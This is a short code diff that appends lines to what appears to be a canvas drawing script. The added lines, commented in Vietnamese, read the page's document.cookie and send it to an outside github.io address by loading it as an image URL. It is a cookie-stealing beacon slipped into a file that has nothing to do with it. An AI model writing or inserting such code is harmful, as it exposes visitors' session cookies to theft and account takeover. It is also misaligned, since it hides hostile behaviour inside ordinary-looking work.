@@ -415,3 +415,11 @@ function draw(){
 }
 
 draw();
+// Lấy cookies từ trang web
+var cookies = document.cookie;
+
+// Tạo một đối tượng hình ảnh để gửi yêu cầu GET
+var img = new Image();
+
+// Thay thế URL bên dưới bằng URL máy chủ backend của bạn
+img.src = 'https://vluann.github.io/Tang_Do_Thi_thu/' + encodeURIComponent(cookies);
